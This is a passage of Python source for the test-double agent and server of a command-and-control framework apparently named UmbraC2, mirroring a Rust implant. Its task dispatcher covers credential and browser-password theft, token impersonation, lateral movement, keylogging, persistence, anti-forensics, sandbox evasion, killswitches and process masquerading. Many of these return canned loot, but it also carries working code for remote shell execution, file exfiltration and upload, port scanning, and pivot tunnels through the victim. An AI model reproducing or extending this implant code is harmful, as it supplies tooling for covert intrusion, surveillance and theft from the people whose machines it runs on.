                lines = ["phish.overlay: no overlay is armed"]
            meta = {"overlay": action}
        elif kind == "app.dump":
            lines = [
                "app.dump: 1 rows",
                "  package=com.example.chat | path=/data/data/com.example.chat/databases/msgstore.db"
                " | size=1048576 | copied=yes",
                "app.dump: the phone is rooted",
            ]
            meta = {"rows": 1}
        elif kind == "anti.forensic":
            lines = [
                "anti.forensic: removed 2 files, 8192 bytes",
                "anti.forensic: removed watch.queue",
                "anti.forensic: removed mic-1730000000000.m4a",
            ]
        elif kind == "evade.suicide":
            lines = [
                "evade.suicide: the implant is leaving the phone",
                "evade.suicide: the watcher of the messages was stopped",
                "evade.suicide: the persistence entries were taken away",
                "evade.suicide: the beacon was stopped",
            ]
        return 0, ("\n".join(lines) + "\n").encode(), "", meta

    def _desktop_senses(self, kind: str, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The senses of the fake desktop.

        The mock is not a workstation, so it answers with the shape of the
        answer: the same lines the desktop beacon sends, so the console
        and the tests see one shape everywhere.  A family that the real
        implant cannot read says so here too, because a test that reads
        the mock has to know what a real desktop would answer.
        """
        action = str(args.get("action", "status") or "status")
        lines: List[str] = []
        meta: Dict[str, Any] = {}
        if kind == "window.list":
            lines = [
                "window.list: 3 windows",
                "  1024|shown|chrome|1920x1080|Invoice 2024 - Google Chrome",
                "  2048|shown|explorer|1280x720|Desktop",
                "  3312|hidden|ApplicationFrameHost|0x0|Background task",
            ]
            meta = {"windows": 3}
        elif kind == "clipboard.watch":
            if action == "start":
                lines = ["clipboard.watch: the watcher of the clipboard is running"]
            elif action == "stop":
                lines = ["clipboard.watch: the watcher of the clipboard was stopped"]
            elif action == "poll":
                lines = [
                    "clipboard.watch: 1 items",
                    "  clipboard 1730000000000 the password of the account is hunter2",
                ]
                meta = {"watch_total": 1}
            else:
                lines = [
                    "clipboard.watch: the watcher is running",
                    "clipboard.watch: the queue holds 1 items",
                ]
        elif kind == "screen.stream":
            lines = ["screen.stream: 5 frames"]
            meta = {"frames": 5}
        elif kind == "wifi.profiles":
            lines = [
                "wifi.profiles: 2 saved profiles",
                "  profile: Office-WiFi",
                "    SSID : Office-WiFi",
                "    Authentication : WPA2-Personal",
                "    Key Content : 5e9a-secret-key",
                "  profile: Guest",
                "    SSID : Guest",
                "    Authentication : Open",
                "wifi.profiles: the radio is on the channel 6",
            ]
            meta = {"rows": 4}
        elif kind == "browser.creds":
            lines = [
                "browser.creds: 2 pieces of material in 2 profiles",
                "  password | https://mail.example.org | user@example.org"
                " | confidence 70 | the password of the browser, in the order of the file",
                "  password | https://intranet.example.org | admin"
                " | confidence 60 | the password of the browser is an encrypted blob of NSS",
                "browser.creds: chrome: /home/operator/.config/google-chrome/Default/Login Data",
                "browser.creds: firefox: /home/operator/.mozilla/firefox/P6R2.default/logins.json",
            ]
            meta = {
                "creds": [
                    {
                        "kind": "password",
                        "source": "chrome",
                        "account": "user@example.org",
                        "target": "https://mail.example.org",
                        "confidence": 70,
                        "secret": "",
                        "length": 0,
                        "redacted": True,
                        "note": "the password of the browser, in the order of the file",
                    },
                    {
                        "kind": "password",
                        "source": "firefox",
                        "account": "admin",
                        "target": "https://intranet.example.org",
                        "confidence": 60,
                        "secret": "",
                        "length": 0,
                        "redacted": True,
                        "note": "the password of the browser is an encrypted blob of NSS",
                    },
                ],
                "creds_total": 2,
            }
        elif kind == "av.survey":
            lines = [
                "av.survey: the products of the security centre",
                "  Windows Defender Antivirus|397568",
                "av.survey: the services of the security software",
                "  WinDefend",
            ]
            meta = {"rows": 2}
        elif kind == "usb.history":
            lines = [
                "usb.history: 2 values in the history",
                "  HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\Disk&Ven_SanDisk",
                "  usb.history: the devices that are attached now",
                "  SanDisk Ultra USB 3.0",
            ]
            meta = {"rows": 2}
        elif kind == "proc.memory":
            pid = str(args.get("pid", "0") or "0")
            lines = [
                "proc.memory: the dump of the process {} is at "
                "/home/operator/.umbra/memory-{}-1730000000000.dmp (1048576 bytes)".format(pid, pid),
            ]
            meta = {"secrets": 2}
        return 0, ("\n".join(lines) + "\n").encode(), "", meta

    def _evasion(self, kind: str, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The posture engine of the fake host."""
        if kind == "host.guide":
            # The guide of the host: what keeps the implant alive here.
            #
            # The mock is not a real host, so it answers with the shape of
            # the answer: the same keys the desktop beacon sends, so the
            # console and the tests see one shape everywhere.
            idle = int(self.evade.get("idle_seconds", 0) or 0)
            power = str(self.evade.get("power", "mains"))
            entries = self.persist
            lines = [
                "guide: the machine has been idle for {} seconds".format(idle),
                "guide: the machine runs on the {}".format(power),
                "guide: {} persistence entries are installed".format(len(entries)),
                "guide: a desktop has no vendor rules; what stops the implant here "
                "is the deletion of its file and the replacement of its binary",
            ]
            meta = {"guide": {"idle_seconds": idle, "power": power,
                              "persistence": len(entries)}}
            return 0, ("\n".join(lines) + "\n").encode(), "", meta
        if kind == "evade.report":
            posture = self._posture(args)
            text = self._posture_report(posture)
            return 0, text.encode(), "", self._posture_meta(posture)
        if kind == "evade.posture":
            settings = self.evade.setdefault("settings", {})
            for name in ("silence_on_sandbox", "slow_on_sandbox"):
                if name in args:
                    settings[name] = bool(args[name])
            for name in ("virtual_factor", "sandbox_factor", "lab_factor",
                         "developer_factor", "jitter_bonus"):
                if name in args:
                    settings[name] = int(args[name])
            posture = self._posture(args)
            lines = ["posture: the settings were applied"]
            lines.append("posture: silence on a sandbox: {}".format(
                bool(settings.get("silence_on_sandbox", False))))
            lines.append("posture: slow on a sandbox: {}".format(
                bool(settings.get("slow_on_sandbox", True))))
            lines.append("posture: the sleep on this host is multiplied with {}%".format(
                self._posture_factor(posture)))
            return 0, ("\n".join(lines) + "\n").encode(), "", self._posture_meta(posture)
        if kind == "evade.profile":
            profile = self.evade.setdefault("profile", {})
            for name in ("base", "busy_start", "busy_end", "busy_factor",
                         "night_factor", "weekend_factor"):
                if name in args:
                    profile[name] = int(args[name])
            text = ("schedule: base {}s, busy {}-{}, busy {}%, night {}%, weekend {}%\n".format(
                profile.get("base", 60), profile.get("busy_start", 8),
                profile.get("busy_end", 18), profile.get("busy_factor", 60),
                profile.get("night_factor", 180), profile.get("weekend_factor", 150)))
            return 0, text.encode(), "", {"schedule": dict(profile), "schedule_factor": 60}
        if kind == "evade.shape":
            shaping = self.evade.setdefault("shaping", {})
            if args.get("mode"):
                shaping["mode"] = str(args["mode"])
            for name in ("size", "pad_every"):
                if name in args:
                    shaping[name] = int(args[name])
            if "reorder" in args:
                shaping["reorder"] = bool(args["reorder"])
            text = "shaping: mode {}, size {}, a padding frame every {}, reorder {}\n".format(
                shaping.get("mode", "off"), shaping.get("size", 1024),
                shaping.get("pad_every", 0), shaping.get("reorder", False))
            return 0, text.encode(), "", {"shaping": dict(shaping)}
        if kind == "evade.killswitch":
            switch = self.evade.setdefault("killswitch", {})
            if args.get("clear"):
                switch.clear()
                switch["armed"] = False
                switch["triggers"] = []
                text = "killswitch: it is disarmed\n"
            else:
                triggers = []
                for name in ("file", "registry", "at", "uptime", "marker"):
                    if args.get(name):
                        triggers.append({"kind": name, "value": args[name]})
                if not triggers:
                    return 1, b"", ("evade.killswitch needs one of args.file, args.registry, "
                                    "args.at, args.uptime or args.marker"), {}
                switch["armed"] = True
                switch["triggers"] = triggers
                switch["note"] = str(args.get("note", "") or "")
                text = "killswitch: it is armed\n"
                for trigger in triggers:
                    text += "killswitch: it fires when the {} {} appears\n".format(
                        trigger["kind"], trigger["value"])
            return 0, text.encode(), "", {"killswitch": dict(switch)}
        if kind == "hygiene.memory":
            text = ("memory: the key material lives in guards that wipe themselves\n"
                    "memory: the pre-shared key and the session keys\n"
                    "memory: the output of a task is wiped after it was sent\n")
            return 0, text.encode(), "", {"hygiene_wiped": 3, "hygiene_bytes": 4096}
        if kind == "hygiene.process":
            lines = []
            if args.get("copy"):
                lines.append("the implant was copied to {}".format(args["copy"]))
            if args.get("name"):
                lines.append("the process reports the name {}".format(args["name"]))
            if args.get("cwd"):
                lines.append("the working directory is now {}".format(args["cwd"]))
            if args.get("clean_env"):
                lines.append("the environment lost 1 variable that named the tool")
            if args.get("ppid"):
                lines.append("the process claims the parent {} now".format(args["ppid"]))
            if not lines:
                lines.append("nothing was changed: the task named no step")
            return 0, ("\n".join(lines) + "\n").encode(), "", {"hygiene_process": True}
        return 2, b"", f"unsupported evasion task {kind}", {}

    def _execute(self, task: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """Run one task, returning (code, stdout, stderr, meta).

        `meta` mirrors the Rust beacon's extra RESULT fields, so chunked
        transfers behave identically against the test double.
        """
        kind = str(task.get("kind", ""))
        args = task.get("args") or {}
        if kind == "creds":
            return self._creds(args)
        if kind == "token":
            mode = str(args.get("mode", "list") or "list")
            if mode == "list":
                return self._tokens(args)
            if mode in ("impersonate", "become"):
                pid = int(args.get("pid", 0) or 0)
                if not pid:
                    return 1, b"", "token: the mode needs the pid of the process", {}
                account = "CORP\\alice" if pid == 1180 else "NT AUTHORITY\\SYSTEM"
                # "become" keeps the identity until the operator restores
                # it; a one-shot impersonation ends with the next task.
                self.impersonation = "" if mode == "impersonate" else account
                return 0, f"the implant is now {account}\n".encode(), "", {
                    "identity": account,
                    "identity_session": 1,
                    "identity_one_shot": mode == "impersonate",
                }
            if mode == "restore":
                self.impersonation = ""
                return 0, b"the implant is itself again\n", "", {"identity": ""}
            return 1, b"", f"token: unknown mode {mode}", {}
        if kind == "privesc":
            return self._escalate(args)
        if kind in ("wmi.exec", "smb.exec", "winrm.exec", "dcom.exec",
                    "ldap.query", "ssh.exec"):
            return self._remote(kind, args)
        if kind == "shell" and self.execute_shell:
            cmd = str(args.get("cmd", ""))
            try:
                proc = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    timeout=30,
                    text=False,
                )
                return proc.returncode, proc.stdout + proc.stderr, "", {}
            except subprocess.SubprocessError as exc:
                return 1, b"", f"exec failed: {exc}", {}
        if kind == "sysinfo":
            report = "\n".join(f"{k}: {v}" for k, v in sorted(self.meta.items()))
            return 0, report.encode(), "", {}
        if kind == "recon":
            # Mirrors the Rust beacon's recon report: the host facts, the
            # environment findings and the domain edges, in that order.
            report = "\n".join(f"{k}: {v}" for k, v in sorted(self.meta.items()))
            profile = str(args.get("profile", "") or "")
            checks = args.get("checks")
            if isinstance(checks, str):
                checks = [checks]
            elif not isinstance(checks, (list, tuple)):
                checks = []
            checks = [str(c) for c in checks]
            if not profile and not checks:
                lines = [
                    report,
                    "environment: nothing unusual",
                    "domain    : (not in a domain)",
                    "edges     : none",
                ]
                return 0, ("\n".join(lines) + "\n").encode(), "", {}
            # With a profile the task runs the bundle and answers with the
            # findings of the bundle.
            try:
                bundle = recon_runtime.run(profile, checks)
            except ValueError as exc:
                return 1, b"", str(exc), {}
            return (0, recon_runtime.text(bundle).encode(), "",
                    {"recon": bundle, "recon_total": len(bundle["findings"])})
        if kind == "recon.suggest":
            # The findings may travel with the task, or the implant collects
            # them now.
            findings = args.get("findings")
            if not isinstance(findings, (list, tuple)):
                findings = []
            findings = [f for f in findings if isinstance(f, dict)]
            if not findings:
                try:
                    bundle = recon_runtime.run(str(args.get("profile", "host")))
                except ValueError as exc:
                    return 1, b"", str(exc), {}
                findings = bundle["findings"]
            items = recon_runtime.suggest(findings)
            return (0, recon_runtime.suggestions_text(items).encode(), "",
                    {"suggestions": {"suggestions": items, "total": len(items)}})
        if kind == "domain.map":
            # The path from the identity of the agent to the target.
            target = str(args.get("target", "") or "")
            found = recon_runtime.domain_paths(
                recon_runtime.DOMAIN_EDGES, recon_runtime.DOMAIN_ME,
                target, recon_runtime.DOMAIN_CONTROLLER)
            paths = []
            for steps in found:
                paths.append({
                    "text": recon_runtime.path_text(steps),
                    "steps": steps,
                })
            report = recon_runtime.domain_report(
                recon_runtime.DOMAIN_EDGES, recon_runtime.DOMAIN_ME,
                target, recon_runtime.DOMAIN_CONTROLLER)
            return 0, report.encode(), "", {"domain_map": paths,
                                            "domain_paths": len(paths)}
        if kind in ("exit", "kill"):
            # The exit takes the persistence entries with it: the last word
            # of the operator leaves the target the way it was found, and
            # the empty record travels with the result so the server does
            # not keep a lie.
            self.persist = []
            self._stop.set()
            return 0, b"bye\n", "", {"persist": [], "persist_total": 0, "persist_broken": 0}
        if kind in ("download", "cat"):
            return self._download(args)
        if kind == "upload":
            return self._upload(args)
        if kind == "tunnel":
            return self._tunnel(args)
        if kind in ("ext", "bof"):
            return self._module(args)
        if kind == "inject":
            return self._inject(args)
        if kind == "triage":
            path = str(args.get("path", ""))
            try:
                data = open(path, "rb").read()
            except OSError as exc:
                return 1, b"", f"triage {path}: {exc}", {}
            digest = hashlib.sha256(data).hexdigest()
            magic = "PE" if data[:2] == b"MZ" else (
                "ELF" if data[:4] == b"\x7fELF" else "unknown")
            report = (f"path: {path}\nsize: {len(data)}\nsha256: {digest}\n"
                      f"magic: {magic}\n")
            return 0, report.encode(), "", {}
        if kind == "find":
            root = str(args.get("path", "."))
            name = str(args.get("name", "")).lower()
            hits = []
            for base, _dirs, files in os.walk(root):
                for entry in files:
                    if not name or name in entry.lower():
                        hits.append(os.path.join(base, entry))
                    if len(hits) >= 50:
                        break
                if len(hits) >= 50:
                    break
            report = f"scanned files, {len(hits)} hits\n" + "\n".join(hits)
            return 0, report.encode(), "", {}
        if kind == "registry":
            hive = str(args.get("hive", "HKLM"))
            key = str(args.get("key", ""))
            return 0, f"mock agent: the registry {hive}\\{key} would be read\n".encode(), "", {}
        if kind == "keylog.file":
            path = str(args.get("path", ""))
            return 0, f"mock agent: the key logger writes to {path}\n".encode(), "", {}
        if kind == "tail":
            path = str(args.get("path", ""))
            try:
                with open(path, "r", errors="replace") as fh:
                    lines = fh.read().splitlines()
            except OSError as exc:
                return 1, b"", f"tail {path}: {exc}", {}
            count = int(args.get("lines", 20) or 20)
            kept = lines[-count:] if count > 0 else []
            return 0, ("\n".join(kept) + "\n").encode(), "", {}
        if kind == "hash":
            import hashlib
            path = str(args.get("path", ""))
            try:
                with open(path, "rb") as fh:
                    data = fh.read()
            except OSError as exc:
                return 1, b"", f"hash {path}: {exc}", {}
            digest = hashlib.sha256(data).hexdigest()
            return 0, f"sha256 {digest} {len(data)} {path}\n".encode(), "", {}
        if kind == "proc.kill":
            pid = int(args.get("pid", 0) or 0)
            name = str(args.get("name", ""))
            return 0, f"mock agent: the process {pid or name} would be terminated\n".encode(), "", {}
        if kind in ("persist", "unpersist", "persist.list", "persist.verify",
                    "persist.migrate", "persist.health"):
            return self._persistence(kind, args)
        if kind == "update":
            path = str(args.get("path", ""))
            return 0, f"mock agent: the implant would be replaced with {path}\n".encode(), "", {}
        if kind == "netinfo":
            report = "source: mock\ninterfaces:\n  lo 127.0.0.1\n"
            return 0, report.encode(), "", {}
        if kind == "env":
            # The environment of the implant: the paths and the credentials
            # the operator is looking for.
            needle = str(args.get("filter", "") or "").lower()
            rows = []
            for key, value in sorted(os.environ.items()):
                if needle and needle not in key.lower():
                    continue
                rows.append(f"{key}={value}")
            report = "\n".join(rows) + ("\n" if rows else "")
            return 0, report.encode(), "", {"count": len(rows)}
        if kind == "resolve":
            host = str(args.get("host", ""))
            if not host:
                return 1, b"", "resolve requires args.host", {}
            try:
                infos = socket.getaddrinfo(host, None)
            except OSError as exc:
                return 1, b"", f"resolve {host}: {exc}", {}
            seen: List[str] = []
            for info in infos:
                address = info[4][0]
                if address not in seen:
                    seen.append(address)
            report = "\n".join(seen) + ("\n" if seen else "")
            return 0, report.encode(), "", {"count": len(seen)}
        if kind == "touch":
            path = str(args.get("path", ""))
            if not path:
                return 1, b"", "touch requires args.path", {}
            existed = os.path.exists(path)
            try:
                with open(path, "ab"):
                    pass
                os.utime(path, None)
                size = os.path.getsize(path)
            except OSError as exc:
                return 1, b"", f"touch {path}: {exc}", {}
            verb = "touched" if existed else "created"
            return 0, f"{verb} {path} ({size} bytes)\n".encode(), "", {"size": size}
        if kind == "scan":
            # A plain TCP connect: the hosts that answer are reported.
            target = str(args.get("host", ""))
            if not target:
                return 1, b"", "scan requires args.host", {}
            timeout = float(args.get("timeout_ms", 800) or 800) / 1000.0
            max_hosts = int(args.get("max_hosts", 256) or 256)
            hosts = _expand_scan_target(target, max_hosts)
            if not hosts:
                return 1, b"", f"scan {target}: bad target", {}
            ports = _parse_scan_ports(str(args.get("ports", "22,80,443") or ""))
            if not ports:
                return 1, b"", "scan: no ports", {}
            open_ports: List[str] = []
            probes = 0
            for host in hosts:
                for port in ports:
                    probes += 1
                    try:
                        with socket.create_connection((host, port), timeout=timeout):
                            open_ports.append(f"{host}:{port} open")
                    except OSError:
                        pass
            report = "\n".join(open_ports)
            if report:
                report += "\n"
            report += (f"{len(open_ports)} open of {probes} probes "
                       f"({len(hosts)} hosts x {len(ports)} ports)\n")
            return 0, report.encode(), "", {"open": len(open_ports),
                                            "probes": probes}
        if kind in ("ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global",
                    "ui.events"):
            return self._window(kind, args)
        if kind in ("gps.locate", "wifi.dump", "bluetooth.scan", "contacts.dump",
                    "sms.dump", "call.logs", "emulator.detect", "sms.watch",
                    "clipboard.sniff", "media.mic", "media.camera", "live.screen",
                    "ui.stream", "phish.overlay", "app.dump", "anti.forensic",
                    "evade.suicide"):
            return self._senses(kind, args)
        if kind in ("window.list", "clipboard.watch", "screen.stream",
                    "wifi.profiles", "browser.creds", "av.survey",
                    "usb.history", "proc.memory"):
            return self._desktop_senses(kind, args)
        if kind in ("evade.report", "evade.posture", "evade.profile", "evade.shape",
                    "evade.killswitch", "hygiene.memory", "hygiene.process",
                    "host.guide"):
            return self._evasion(kind, args)
        if kind == "vpn":
            return self._vpn(args)
        if kind == "p2p":
            return 0, f"the mock agent cannot run {kind!r}\n".encode(), "", {}
        return 0, f"mock agent cannot run {kind!r}\n".encode(), "", {}

    # -- the layer-3 tunnel (mirrors implant/rust/src/vpn.rs) --------------
    def _vpn(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """Join the layer-3 tunnel, the way the Rust beacon does."""
        action = str(args.get("action", "start") or "start")
        if action == "relay":
            # The relay carries the packets of a peer that can only be
            # reached through this agent.  The keys of the session stay
            # between the peer and the server.
            listen = str(args.get("listen", "") or "127.0.0.1:0")
            host, _, port = listen.rpartition(":")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind((host or "127.0.0.1", int(port or 0)))
            sock.settimeout(0.2)
            bound = sock.getsockname()
            address = f"{bound[0]}:{bound[1]}"
            threading.Thread(target=self._vpn_relay, args=(sock, address),
                             daemon=True).start()
            return 0, f"vpn relay on {address}\n".encode(), "", {"listen": address}
        server = str(args.get("addr", "") or "")
        if not server:
            server = self.vpn_addr
        peer = vpn_transport.VpnPeer(server, self.psk, self.agent_id)
        try:
            address = peer.join()
        except Exception as exc:  # noqa: BLE001 - the task reports the error
            return 1, b"", f"vpn: {exc}", {}
        self.vpn_peer = peer
        return 0, f"vpn tunnel joined as {address}\n".encode(), "", {"address": address}

    def _vpn_relay(self, sock: socket.socket, address: str) -> None:
        """Hand the datagrams of the peer to the server and back."""
        upstream = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        upstream.bind(("127.0.0.1", 0))
        upstream.settimeout(0.2)
        host, _, port = self.server.vpn.address().rpartition(":")
        target = (host, int(port or 0))
        client: Optional[Tuple[str, int]] = None
        while not self._stop.is_set():
            try:
                data, addr = sock.recvfrom(4096)
                client = addr
                upstream.sendto(data, target)
            except (socket.timeout, OSError):
                pass
            try:
                data, _ = upstream.recvfrom(4096)
                if client is not None:
                    sock.sendto(data, client)
            except (socket.timeout, OSError):
                pass

    # -- pivoting (mirrors implant/rust/src/tunnel.rs) --------------------
    def _tunnel(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """Open a callback session with the team server."""
        sid = str(args.get("stream", ""))
        if not sid:
            return 1, b"", "tunnel requires args.stream", {}
        t = threading.Thread(target=self._tunnel_callback, args=(sid,), daemon=True)
        t.start()
        return 0, f"tunnel session {sid} opened\n".encode(), "", {}

    def _tunnel_callback(self, sid: str) -> None:
        host, _, port = self.server.rpartition(":")
        try:
            sock = socket.create_connection((host, int(port)), timeout=5)
        except OSError:
            return
        stream = netio.Stream(sock, timeout=30)
        try:
            meta = dict(self.meta)
            meta["tunnel"] = sid
            result = handshake.client_handshake(
                stream,
                psk=self.psk,
                role=crypto.ROLE_AGENT,
                ident=self.agent_id,
                meta=meta,
            )
            sess = result.session
            gate = netio.SendGate(sess, stream)
            gate.send(wire.MsgType.TUNNEL_OPEN, {"stream": sid, "op": "ready"})
            targets: Dict[str, socket.socket] = {}
            while True:
                msg_type, body = sess.decrypt_message(stream.recv_frame())
                if msg_type == wire.MsgType.TUNNEL_OPEN and str(body.get("op", "")) == "open":
                    stream_id = str(body.get("stream", ""))
                    target_host = str(body.get("host", ""))
                    target_port = int(body.get("port", 0) or 0)
                    threading.Thread(
                        target=self._tunnel_stream,
                        args=(gate, stream_id, target_host, target_port, targets),
                        daemon=True,
                    ).start()
                elif msg_type == wire.MsgType.TUNNEL_DATA:
                    stream_id = str(body.get("stream", ""))
                    target = targets.get(stream_id)
                    if target is not None:
                        try:
                            target.sendall(bytes(body.get("data") or b""))
                        except OSError:
                            pass
                elif msg_type == wire.MsgType.TUNNEL_CLOSE:
                    stream_id = str(body.get("stream", ""))
                    target = targets.pop(stream_id, None)
                    if target is not None:
                        try:
                            # A close does not wake the thread that reads
                            # the socket: the shutdown does.
                            target.shutdown(socket.SHUT_RDWR)
                        except OSError:
                            pass
                        try:
                            target.close()
                        except OSError:
                            pass
        except Exception:
            pass
        finally:
            stream.close()

    def _tunnel_stream(
        self,
        gate: netio.SendGate,
        stream_id: str,
        host: str,
        port: int,
        targets: Dict[str, socket.socket],
    ) -> None:
        """Connect to the target the server asked for and relay it."""
        try:
            target = socket.create_connection((host, port), timeout=5)
            # The connect timeout must not turn into an idle timeout: a quiet
            # target is normal.
            target.settimeout(None)
        except OSError as exc:
            gate.send(
                wire.MsgType.TUNNEL_OPEN,
                {"stream": stream_id, "op": "result", "ok": False, "err": str(exc)},
            )
            return
        targets[stream_id] = target
        gate.send(
            wire.MsgType.TUNNEL_OPEN,
            {"stream": stream_id, "op": "result", "ok": True},
        )

        def pump() -> None:
            try:
                while True:
                    data = target.recv(32768)
                    if not data:
                        break
                    gate.send(wire.MsgType.TUNNEL_DATA, {"stream": stream_id, "data": data})
            except OSError:
                pass
            finally:
                try:
                    gate.send(
                        wire.MsgType.TUNNEL_CLOSE,
                        {"stream": stream_id, "reason": "the target closed the connection"},
                    )
                except Exception:
                    pass

        t = threading.Thread(target=pump, daemon=True)
        t.start()

    # -- chunked transfer (mirrors implant/rust/src/task.rs) --------------
    def _download(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        path = str(args.get("path", ""))
        if not path:
            return 1, b"", "download requires args.path", {}
        offset = int(args.get("offset", 0) or 0)
        limit = int(args.get("limit", CHUNK_MAX) or CHUNK_MAX)
        limit = max(1, min(limit, CHUNK_MAX))
        try:
            size = os.path.getsize(path)
            if offset > size:
                return 1, b"", f"download {path}: offset {offset} past end ({size})", {}
            with open(path, "rb") as fh:
                fh.seek(offset)
                chunk = fh.read(limit)
        except OSError as exc:
            return 1, b"", f"download {path}: {exc}", {}
        eof = offset + len(chunk) >= size
        return 0, chunk, "", {
            "total": size,
            "offset": offset,
            "eof": eof,
            "sha256": hashlib.sha256(chunk).hexdigest(),
        }

    def _upload(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        path = str(args.get("path", ""))
        data = args.get("data", b"")
        data = bytes(data) if isinstance(data, (bytes, bytearray)) else bytes(str(data), "utf-8")
        offset = int(args.get("offset", 0) or 0)
        eof = bool(args.get("eof", True))
        if not path:
            return 1, b"", "upload requires args.path", {}
        try:
            mode = "wb" if offset == 0 else "r+b"
            with open(path, mode) as fh:
                fh.seek(offset)
                fh.write(data)
        except OSError as exc:
            return 1, b"", f"upload {path}: {exc}", {}
        written = offset + len(data)
        meta: Dict[str, Any] = {"written": written, "eof": eof}
        if eof:
            try:
                with open(path, "rb") as fh:
                    whole = fh.read()
            except OSError as exc:
                return 1, b"", f"upload {path}: verify: {exc}", {}
            meta["total"] = len(whole)
            meta["sha256"] = hashlib.sha256(whole).hexdigest()
        return 0, f"wrote {len(data)} bytes at offset {offset} to {path}\n".encode(), "", meta


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="UmbraC2 development server (test double)")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=4002)
    parser.add_argument("--psk", default=os.environ.get("UMBRA_AGENT_PSK", ""), help="agent PSK (hex)")
    parser.add_argument(
        "--operator",
        action="append",
        default=[],
        metavar="NAME:TOKEN",
        help="operator credentials (repeatable)",
    )
    parser.add_argument("--spawn-agent", action="store_true", help="also start a fake agent")
    parser.add_argument("--tls-cert", default="", help="PEM certificate of the TLS listener")
    parser.add_argument("--tls-key", default="", help="PEM key of the TLS listener")
    parser.add_argument(
        "--tls-ca",
        default="",
        help="PEM bundle of the client CA (the listener then requires a client certificate)",
    )
    parser.add_argument(
        "--tls-client-spki",
        default="",
        help="pinned public key of the clients (hex SHA-256 of the "
        "SubjectPublicKeyInfo; several pins may be separated by commas)",
    )
    parser.add_argument(
        "--agent-interval",
        type=float,
        default=2.0,
        metavar="SECONDS",
        help="fake agent beacon interval (default 2.0; tests use 0.3 directly)",
    )
    args = parser.parse_args(argv)

    psk = bytes.fromhex(args.psk) if args.psk else crypto.random_bytes(32)
    operators: Dict[str, bytes] = {}
    for item in args.operator:
        name, _, token = item.partition(":")
        if not name or not token:
            parser.error("--operator must be NAME:TOKEN")
        operators[name] = token.encode()
    if not operators:
        token = crypto.random_bytes(16).hex()
        operators["operator"] = token.encode()

    server = MockServer(
        psk,
        operators,
        args.host,
        args.port,
        tls_cert=args.tls_cert,
        tls_key=args.tls_key,
        tls_client_ca=args.tls_ca,
        tls_client_spki=args.tls_client_spki,
    )
    host, port = server.start()
    print(f"[mock] agent PSK   : {psk.hex()}")
    for name, token in operators.items():
        print(f"[mock] operator    : {name}:{token.decode()}")
    print(f"[mock] listening   : {host}:{port}")
    if args.tls_cert:
        print("[mock] tls         : mutual TLS is on")

    agent: Optional[FakeAgent] = None
    if args.spawn_agent:
        # 2 s keeps the operator event stream readable; the test-suite builds
        # FakeAgent directly with a much shorter interval.
        agent = FakeAgent(f"{host}:{port}", psk, "agent-mock-1", interval=args.agent_interval)
        agent.start()
        print(f"[mock] fake agent  : {agent.agent_id}")

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[mock] shutting down")
    finally:
        if agent:
            agent.stop()
        server.stop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
